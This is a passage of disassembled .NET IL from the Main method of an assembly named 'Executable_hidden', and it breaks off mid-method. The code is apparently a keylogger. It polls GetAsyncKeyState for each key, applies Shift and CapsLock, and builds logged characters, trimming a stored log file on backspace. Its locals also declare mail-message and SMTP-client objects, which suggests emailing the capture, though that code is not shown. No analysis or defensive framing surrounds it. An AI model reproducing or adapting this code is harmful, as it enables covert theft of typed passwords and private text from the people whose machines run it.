  .method public static void  Main() cil managed
  {
    .entrypoint
    .custom instance void [mscorlib]System.STAThreadAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       3259 (0xcbb)
    .maxstack  10
    .locals init (int32 V_0,
             int32 V_1,
             object V_2,
             object V_3,
             object V_4,
             object V_5,
             class [System]System.Net.Mail.MailMessage V_6,
             object V_7,
             object[] V_8,
             bool[] V_9,
             class [System]System.Net.Mail.SmtpClient V_10,
             string[] V_11,
             int32 V_12,
             string V_13)
    IL_0000:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetExecutingAssembly()
    IL_0005:  callvirt   instance string [mscorlib]System.Reflection.Assembly::get_Location()
    IL_000a:  ldstr      "temp"
    IL_000f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_0014:  ldstr      "\\"
    IL_0019:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
    IL_001e:  callvirt   instance string [mscorlib]System.AppDomain::get_FriendlyName()
    IL_0023:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0028:  ldc.i4.0
    IL_0029:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_002e:  brtrue     IL_0c17

    IL_0033:  ldc.i4.s   10
    IL_0035:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_003a:  ldc.i4.8
    IL_003b:  stloc.0
    IL_003c:  ldloc.0
    IL_003d:  stloc.1
    IL_003e:  ldloc.1
    IL_003f:  ldc.i4.8
    IL_0040:  beq.s      IL_0086

    IL_0042:  ldloc.1
    IL_0043:  ldc.i4.s   13
    IL_0045:  beq.s      IL_0086

    IL_0047:  ldloc.1
    IL_0048:  ldc.i4.s   32
    IL_004a:  beq.s      IL_0086

    IL_004c:  ldloc.1
    IL_004d:  ldc.i4.s   48
    IL_004f:  blt.s      IL_0056

    IL_0051:  ldloc.1
    IL_0052:  ldc.i4.s   57
    IL_0054:  ble.s      IL_0086

    IL_0056:  ldloc.1
    IL_0057:  ldc.i4.s   65
    IL_0059:  blt.s      IL_0060

    IL_005b:  ldloc.1
    IL_005c:  ldc.i4.s   90
    IL_005e:  ble.s      IL_0086

    IL_0060:  ldloc.1
    IL_0061:  ldc.i4     0xba
    IL_0066:  blt.s      IL_0070

    IL_0068:  ldloc.1
    IL_0069:  ldc.i4     0xc0
    IL_006e:  ble.s      IL_0086

    IL_0070:  ldloc.1
    IL_0071:  ldc.i4     0xdb
    IL_0076:  blt        IL_0c03

    IL_007b:  ldloc.1
    IL_007c:  ldc.i4     0xde
    IL_0081:  bgt        IL_0c03

    IL_0086:  ldloc.0
    IL_0087:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_008c:  ldc.i4     0xffff8001
    IL_0091:  bne.un     IL_0c03

    IL_0096:  call       class Executable_hidden.My.MyComputer Executable_hidden.My.MyProject::get_Computer()
    IL_009b:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_00a0:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CtrlKeyDown()
    IL_00a5:  brtrue     IL_0c03

    IL_00aa:  call       class Executable_hidden.My.MyComputer Executable_hidden.My.MyProject::get_Computer()
    IL_00af:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_00b4:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CapsLock()
    IL_00b9:  ldc.i4.0
    IL_00ba:  ceq
    IL_00bc:  call       class Executable_hidden.My.MyComputer Executable_hidden.My.MyProject::get_Computer()
    IL_00c1:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_00c6:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_ShiftKeyDown()
    IL_00cb:  ldc.i4.0
    IL_00cc:  ceq
    IL_00ce:  and
    IL_00cf:  box        [mscorlib]System.Boolean
    IL_00d4:  stloc.2
    IL_00d5:  call       class Executable_hidden.My.MyComputer Executable_hidden.My.MyProject::get_Computer()
    IL_00da:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_00df:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_ShiftKeyDown()
    IL_00e4:  box        [mscorlib]System.Boolean
    IL_00e9:  stloc.3
    IL_00ea:  ldc.i4.8
    IL_00eb:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_00f0:  ldc.i4.0
    IL_00f1:  cgt.un
    IL_00f3:  brfalse    IL_01c2

    IL_00f8:  call       class Executable_hidden.My.MyComputer Executable_hidden.My.MyProject::get_Computer()
    IL_00fd:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_0102:  ldsfld     object Executable_hidden.Module1::p
    IL_0107:  ldsfld     object Executable_hidden.Module1::q
    IL_010c:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0111:  ldsfld     object Executable_hidden.Module1::t
    IL_0116:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_011b:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0120:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::FileExists(string)
    IL_0125:  brfalse    IL_09c1

    IL_012a:  call       class Executable_hidden.My.MyComputer Executable_hidden.My.MyProject::get_Computer()
    IL_012f:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_0134:  ldsfld     object Executable_hidden.Module1::p
    IL_0139:  ldsfld     object Executable_hidden.Module1::q
    IL_013e:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0143:  ldsfld     object Executable_hidden.Module1::t
    IL_0148:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_014d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0152:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::ReadAllText(string)
    IL_0157:  stloc.s    V_4
    IL_0159:  ldloc.s    V_4
    IL_015b:  ldstr      ""
    IL_0160:  ldc.i4.0
    IL_0161:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareObjectEqual(object,
                                                                                                                            object,
                                                                                                                            bool)
    IL_0166:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::NotObject(object)
    IL_016b:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0170:  brfalse    IL_09c1

    IL_0175:  call       class Executable_hidden.My.MyComputer Executable_hidden.My.MyProject::get_Computer()
    IL_017a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_017f:  ldsfld     object Executable_hidden.Module1::p
    IL_0184:  ldsfld     object Executable_hidden.Module1::q
    IL_0189:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_018e:  ldsfld     object Executable_hidden.Module1::t
    IL_0193:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0198:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_019d:  ldloc.s    V_4
    IL_019f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_01a4:  ldloc.s    V_4
    IL_01a6:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_01ab:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Len(object)
    IL_01b0:  ldc.i4.1
    IL_01b1:  sub
    IL_01b2:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Left(string,
                                                                                           int32)
    IL_01b7:  ldc.i4.0
    IL_01b8:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::WriteAllText(string,
                                                                                                                             string,
                                                                                                                             bool)
    IL_01bd:  br         IL_09c1

    IL_01c2:  ldc.i4.s   13
    IL_01c4:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_01c9:  ldc.i4.0
    IL_01ca:  cgt.un
    IL_01cc:  brfalse.s  IL_01dd

    IL_01ce:  ldstr      "\r\n"
    IL_01d3:  stsfld     object Executable_hidden.Module1::l
    IL_01d8:  br         IL_09c1

    IL_01dd:  ldc.i4.s   32
    IL_01df:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_01e4:  ldc.i4.0
    IL_01e5:  cgt.un
    IL_01e7:  brfalse.s  IL_01f8

    IL_01e9:  ldstr      " "
    IL_01ee:  stsfld     object Executable_hidden.Module1::l
    IL_01f3:  br         IL_09c1

    IL_01f8:  ldc.i4.s   48
    IL_01fa:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_01ff:  ldc.i4.0
    IL_0200:  cgt.un
    IL_0202:  brfalse.s  IL_0222

    IL_0204:  ldloc.3
    IL_0205:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_020a:  brtrue.s   IL_0213

    IL_020c:  ldstr      "0"
    IL_0211:  br.s       IL_0218

    IL_0213:  ldstr      ")"
    IL_0218:  stsfld     object Executable_hidden.Module1::l
    IL_021d:  br         IL_09c1

    IL_0222:  ldc.i4.s   49
    IL_0224:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_0229:  ldc.i4.0
    IL_022a:  cgt.un
    IL_022c:  brfalse.s  IL_024c

    IL_022e:  ldloc.3
    IL_022f:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0234:  brtrue.s   IL_023d

    IL_0236:  ldstr      "1"
    IL_023b:  br.s       IL_0242

    IL_023d:  ldstr      "!"
    IL_0242:  stsfld     object Executable_hidden.Module1::l
    IL_0247:  br         IL_09c1

    IL_024c:  ldc.i4.s   50
    IL_024e:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_0253:  ldc.i4.0
    IL_0254:  cgt.un
    IL_0256:  brfalse.s  IL_0276

    IL_0258:  ldloc.3
    IL_0259:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_025e:  brtrue.s   IL_0267

    IL_0260:  ldstr      "2"
    IL_0265:  br.s       IL_026c

    IL_0267:  ldstr      "@"
    IL_026c:  stsfld     object Executable_hidden.Module1::l
    IL_0271:  br         IL_09c1

    IL_0276:  ldc.i4.s   51
    IL_0278:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_027d:  ldc.i4.0
    IL_027e:  cgt.un
    IL_0280:  brfalse.s  IL_02a0

    IL_0282:  ldloc.3
    IL_0283:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0288:  brtrue.s   IL_0291

    IL_028a:  ldstr      "3"
    IL_028f:  br.s       IL_0296

    IL_0291:  ldstr      "#"
    IL_0296:  stsfld     object Executable_hidden.Module1::l
    IL_029b:  br         IL_09c1

    IL_02a0:  ldc.i4.s   52
    IL_02a2:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_02a7:  ldc.i4.0
    IL_02a8:  cgt.un
    IL_02aa:  brfalse.s  IL_02ca

    IL_02ac:  ldloc.3
    IL_02ad:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_02b2:  brtrue.s   IL_02bb

    IL_02b4:  ldstr      "4"
    IL_02b9:  br.s       IL_02c0

    IL_02bb:  ldstr      "$"
    IL_02c0:  stsfld     object Executable_hidden.Module1::l
    IL_02c5:  br         IL_09c1

    IL_02ca:  ldc.i4.s   53
    IL_02cc:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_02d1:  ldc.i4.0
    IL_02d2:  cgt.un
    IL_02d4:  brfalse.s  IL_02f4

    IL_02d6:  ldloc.3
    IL_02d7:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_02dc:  brtrue.s   IL_02e5

    IL_02de:  ldstr      "5"
    IL_02e3:  br.s       IL_02ea

    IL_02e5:  ldstr      "%"
    IL_02ea:  stsfld     object Executable_hidden.Module1::l
    IL_02ef:  br         IL_09c1

    IL_02f4:  ldc.i4.s   54
    IL_02f6:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_02fb:  ldc.i4.0
    IL_02fc:  cgt.un
    IL_02fe:  brfalse.s  IL_031e

    IL_0300:  ldloc.3
    IL_0301:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0306:  brtrue.s   IL_030f

    IL_0308:  ldstr      "6"
    IL_030d:  br.s       IL_0314

    IL_030f:  ldstr      "^"
    IL_0314:  stsfld     object Executable_hidden.Module1::l
    IL_0319:  br         IL_09c1

    IL_031e:  ldc.i4.s   55
    IL_0320:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_0325:  ldc.i4.0
    IL_0326:  cgt.un
    IL_0328:  brfalse.s  IL_0348

    IL_032a:  ldloc.3
    IL_032b:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0330:  brtrue.s   IL_0339

    IL_0332:  ldstr      "7"
    IL_0337:  br.s       IL_033e

    IL_0339:  ldstr      "&"
    IL_033e:  stsfld     object Executable_hidden.Module1::l
    IL_0343:  br         IL_09c1

    IL_0348:  ldc.i4.s   56
    IL_034a:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_034f:  ldc.i4.0
    IL_0350:  cgt.un
    IL_0352:  brfalse.s  IL_0372

    IL_0354:  ldloc.3
    IL_0355:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_035a:  brtrue.s   IL_0363

    IL_035c:  ldstr      "8"
    IL_0361:  br.s       IL_0368

    IL_0363:  ldstr      "*"
    IL_0368:  stsfld     object Executable_hidden.Module1::l
    IL_036d:  br         IL_09c1

    IL_0372:  ldc.i4.s   57
    IL_0374:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_0379:  ldc.i4.0
    IL_037a:  cgt.un
    IL_037c:  brfalse.s  IL_039c

    IL_037e:  ldloc.3
    IL_037f:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0384:  brtrue.s   IL_038d

    IL_0386:  ldstr      "9"
    IL_038b:  br.s       IL_0392

    IL_038d:  ldstr      "("
    IL_0392:  stsfld     object Executable_hidden.Module1::l
    IL_0397:  br         IL_09c1

    IL_039c:  ldc.i4.s   65
    IL_039e:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_03a3:  ldc.i4.0
    IL_03a4:  cgt.un
    IL_03a6:  brfalse.s  IL_03c6

    IL_03a8:  ldloc.2
    IL_03a9:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_03ae:  brtrue.s   IL_03b7

    IL_03b0:  ldstr      "A"
    IL_03b5:  br.s       IL_03bc

    IL_03b7:  ldstr      "a"
    IL_03bc:  stsfld     object Executable_hidden.Module1::l
    IL_03c1:  br         IL_09c1

    IL_03c6:  ldc.i4.s   66
    IL_03c8:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_03cd:  ldc.i4.0
    IL_03ce:  cgt.un
    IL_03d0:  brfalse.s  IL_03f0

    IL_03d2:  ldloc.2
    IL_03d3:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_03d8:  brtrue.s   IL_03e1

    IL_03da:  ldstr      "B"
    IL_03df:  br.s       IL_03e6

    IL_03e1:  ldstr      "b"
    IL_03e6:  stsfld     object Executable_hidden.Module1::l
    IL_03eb:  br         IL_09c1

    IL_03f0:  ldc.i4.s   67
    IL_03f2:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_03f7:  ldc.i4.0
    IL_03f8:  cgt.un
    IL_03fa:  brfalse.s  IL_041a

    IL_03fc:  ldloc.2
    IL_03fd:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0402:  brtrue.s   IL_040b

    IL_0404:  ldstr      "C"
    IL_0409:  br.s       IL_0410

    IL_040b:  ldstr      "c"
    IL_0410:  stsfld     object Executable_hidden.Module1::l
    IL_0415:  br         IL_09c1

    IL_041a:  ldc.i4.s   68
    IL_041c:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_0421:  ldc.i4.0
    IL_0422:  cgt.un
    IL_0424:  brfalse.s  IL_0444

    IL_0426:  ldloc.2
    IL_0427:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_042c:  brtrue.s   IL_0435

    IL_042e:  ldstr      "D"
    IL_0433:  br.s       IL_043a

    IL_0435:  ldstr      "d"
    IL_043a:  stsfld     object Executable_hidden.Module1::l
    IL_043f:  br         IL_09c1

    IL_0444:  ldc.i4.s   69
    IL_0446:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_044b:  ldc.i4.0
    IL_044c:  cgt.un
    IL_044e:  brfalse.s  IL_046e

    IL_0450:  ldloc.2
    IL_0451:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0456:  brtrue.s   IL_045f

    IL_0458:  ldstr      "E"
    IL_045d:  br.s       IL_0464

    IL_045f:  ldstr      "e"
    IL_0464:  stsfld     object Executable_hidden.Module1::l
    IL_0469:  br         IL_09c1

    IL_046e:  ldc.i4.s   70
    IL_0470:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_0475:  ldc.i4.0
    IL_0476:  cgt.un
    IL_0478:  brfalse.s  IL_0498

    IL_047a:  ldloc.2
    IL_047b:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0480:  brtrue.s   IL_0489

    IL_0482:  ldstr      "F"
    IL_0487:  br.s       IL_048e

    IL_0489:  ldstr      "f"
    IL_048e:  stsfld     object Executable_hidden.Module1::l
    IL_0493:  br         IL_09c1

    IL_0498:  ldc.i4.s   71
    IL_049a:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_049f:  ldc.i4.0
    IL_04a0:  cgt.un
    IL_04a2:  brfalse.s  IL_04c2

    IL_04a4:  ldloc.2
    IL_04a5:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_04aa:  brtrue.s   IL_04b3

    IL_04ac:  ldstr      "G"
    IL_04b1:  br.s       IL_04b8

    IL_04b3:  ldstr      "g"
    IL_04b8:  stsfld     object Executable_hidden.Module1::l
    IL_04bd:  br         IL_09c1

    IL_04c2:  ldc.i4.s   72
    IL_04c4:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_04c9:  ldc.i4.0
    IL_04ca:  cgt.un
    IL_04cc:  brfalse.s  IL_04ec

    IL_04ce:  ldloc.2
    IL_04cf:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_04d4:  brtrue.s   IL_04dd

    IL_04d6:  ldstr      "H"
    IL_04db:  br.s       IL_04e2

    IL_04dd:  ldstr      "h"
    IL_04e2:  stsfld     object Executable_hidden.Module1::l
    IL_04e7:  br         IL_09c1

    IL_04ec:  ldc.i4.s   73
    IL_04ee:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_04f3:  ldc.i4.0
    IL_04f4:  cgt.un
    IL_04f6:  brfalse.s  IL_0516

    IL_04f8:  ldloc.2
    IL_04f9:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_04fe:  brtrue.s   IL_0507

    IL_0500:  ldstr      "I"
    IL_0505:  br.s       IL_050c

    IL_0507:  ldstr      "i"
    IL_050c:  stsfld     object Executable_hidden.Module1::l
    IL_0511:  br         IL_09c1

    IL_0516:  ldc.i4.s   74
    IL_0518:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_051d:  ldc.i4.0
    IL_051e:  cgt.un
    IL_0520:  brfalse.s  IL_0540

    IL_0522:  ldloc.2
    IL_0523:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0528:  brtrue.s   IL_0531

    IL_052a:  ldstr      "J"
    IL_052f:  br.s       IL_0536

    IL_0531:  ldstr      "j"
    IL_0536:  stsfld     object Executable_hidden.Module1::l
    IL_053b:  br         IL_09c1

    IL_0540:  ldc.i4.s   75
    IL_0542:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_0547:  ldc.i4.0
    IL_0548:  cgt.un
    IL_054a:  brfalse.s  IL_056a

    IL_054c:  ldloc.2
    IL_054d:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0552:  brtrue.s   IL_055b

    IL_0554:  ldstr      "K"
    IL_0559:  br.s       IL_0560

    IL_055b:  ldstr      "k"
    IL_0560:  stsfld     object Executable_hidden.Module1::l
    IL_0565:  br         IL_09c1

    IL_056a:  ldc.i4.s   76
    IL_056c:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_0571:  ldc.i4.0
    IL_0572:  cgt.un
    IL_0574:  brfalse.s  IL_0594

    IL_0576:  ldloc.2
    IL_0577:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_057c:  brtrue.s   IL_0585

    IL_057e:  ldstr      "L"
    IL_0583:  br.s       IL_058a

    IL_0585:  ldstr      "l"
    IL_058a:  stsfld     object Executable_hidden.Module1::l
    IL_058f:  br         IL_09c1

    IL_0594:  ldc.i4.s   77
    IL_0596:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_059b:  ldc.i4.0
    IL_059c:  cgt.un
    IL_059e:  brfalse.s  IL_05be

    IL_05a0:  ldloc.2
    IL_05a1:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_05a6:  brtrue.s   IL_05af

    IL_05a8:  ldstr      "M"
    IL_05ad:  br.s       IL_05b4

    IL_05af:  ldstr      "m"
    IL_05b4:  stsfld     object Executable_hidden.Module1::l
    IL_05b9:  br         IL_09c1

    IL_05be:  ldc.i4.s   78
    IL_05c0:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_05c5:  ldc.i4.0
    IL_05c6:  cgt.un
    IL_05c8:  brfalse.s  IL_05e8

    IL_05ca:  ldloc.2
    IL_05cb:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_05d0:  brtrue.s   IL_05d9

    IL_05d2:  ldstr      "N"
    IL_05d7:  br.s       IL_05de

    IL_05d9:  ldstr      "n"
    IL_05de:  stsfld     object Executable_hidden.Module1::l
    IL_05e3:  br         IL_09c1

    IL_05e8:  ldc.i4.s   79
    IL_05ea:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_05ef:  ldc.i4.0
    IL_05f0:  cgt.un
    IL_05f2:  brfalse.s  IL_0612

    IL_05f4:  ldloc.2
    IL_05f5:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_05fa:  brtrue.s   IL_0603

    IL_05fc:  ldstr      "O"
    IL_0601:  br.s       IL_0608

    IL_0603:  ldstr      "o"
    IL_0608:  stsfld     object Executable_hidden.Module1::l
    IL_060d:  br         IL_09c1

    IL_0612:  ldc.i4.s   80
    IL_0614:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_0619:  ldc.i4.0
    IL_061a:  cgt.un
    IL_061c:  brfalse.s  IL_063c

    IL_061e:  ldloc.2
    IL_061f:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0624:  brtrue.s   IL_062d

    IL_0626:  ldstr      "P"
    IL_062b:  br.s       IL_0632

    IL_062d:  ldstr      "p"
    IL_0632:  stsfld     object Executable_hidden.Module1::l
    IL_0637:  br         IL_09c1

    IL_063c:  ldc.i4.s   81
    IL_063e:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_0643:  ldc.i4.0
    IL_0644:  cgt.un
    IL_0646:  brfalse.s  IL_0666

    IL_0648:  ldloc.2
    IL_0649:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_064e:  brtrue.s   IL_0657

    IL_0650:  ldstr      "Q"
    IL_0655:  br.s       IL_065c

    IL_0657:  ldstr      "q"
    IL_065c:  stsfld     object Executable_hidden.Module1::l
    IL_0661:  br         IL_09c1

    IL_0666:  ldc.i4.s   82
    IL_0668:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_066d:  ldc.i4.0
    IL_066e:  cgt.un
    IL_0670:  brfalse.s  IL_0690

    IL_0672:  ldloc.2
    IL_0673:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0678:  brtrue.s   IL_0681

    IL_067a:  ldstr      "R"
    IL_067f:  br.s       IL_0686

    IL_0681:  ldstr      "r"
    IL_0686:  stsfld     object Executable_hidden.Module1::l
    IL_068b:  br         IL_09c1

    IL_0690:  ldc.i4.s   83
    IL_0692:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_0697:  ldc.i4.0
    IL_0698:  cgt.un
    IL_069a:  brfalse.s  IL_06ba

    IL_069c:  ldloc.2
    IL_069d:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_06a2:  brtrue.s   IL_06ab

    IL_06a4:  ldstr      "S"
    IL_06a9:  br.s       IL_06b0

    IL_06ab:  ldstr      "s"
    IL_06b0:  stsfld     object Executable_hidden.Module1::l
    IL_06b5:  br         IL_09c1

    IL_06ba:  ldc.i4.s   84
    IL_06bc:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_06c1:  ldc.i4.0
    IL_06c2:  cgt.un
    IL_06c4:  brfalse.s  IL_06e4

    IL_06c6:  ldloc.2
    IL_06c7:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_06cc:  brtrue.s   IL_06d5

    IL_06ce:  ldstr      "T"
    IL_06d3:  br.s       IL_06da

    IL_06d5:  ldstr      "t"
    IL_06da:  stsfld     object Executable_hidden.Module1::l
    IL_06df:  br         IL_09c1

    IL_06e4:  ldc.i4.s   85
    IL_06e6:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_06eb:  ldc.i4.0
    IL_06ec:  cgt.un
    IL_06ee:  brfalse.s  IL_070e

    IL_06f0:  ldloc.2
    IL_06f1:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_06f6:  brtrue.s   IL_06ff

    IL_06f8:  ldstr      "U"
    IL_06fd:  br.s       IL_0704

    IL_06ff:  ldstr      "u"
    IL_0704:  stsfld     object Executable_hidden.Module1::l
    IL_0709:  br         IL_09c1

    IL_070e:  ldc.i4.s   86
    IL_0710:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_0715:  ldc.i4.0
    IL_0716:  cgt.un
    IL_0718:  brfalse.s  IL_0738

    IL_071a:  ldloc.2
    IL_071b:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
